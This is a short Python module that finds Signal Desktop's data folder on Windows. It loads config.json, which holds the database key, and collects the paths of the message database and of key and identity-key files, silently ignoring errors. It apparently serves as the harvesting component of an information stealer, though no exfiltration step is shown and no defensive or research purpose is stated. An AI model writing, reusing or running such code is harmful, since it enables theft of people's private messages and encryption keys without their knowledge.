import os
import json

SIGNAL_PATH = os.path.join(os.environ.get("APPDATA", ""), "Signal")


def extract_signal_config() -> dict:
    result = {"path": SIGNAL_PATH, "config": None, "sql": None}
    if not os.path.exists(SIGNAL_PATH):
        return result
    try:
        config_path = os.path.join(SIGNAL_PATH, "config.json")
        if os.path.exists(config_path):
            with open(config_path) as f:
                result["config"] = json.load(f)
        sql_path = os.path.join(SIGNAL_PATH, "sql", "db.sqlite")
        if os.path.exists(sql_path):
            result["sql"] = sql_path
        for key_file in ["key", "private_key", "identity_key"]:
            kp = os.path.join(SIGNAL_PATH, key_file)
            if os.path.exists(kp):
                result[key_file] = kp
    except Exception:
        pass
    return result


def extract_all() -> dict:
    return extract_signal_config()
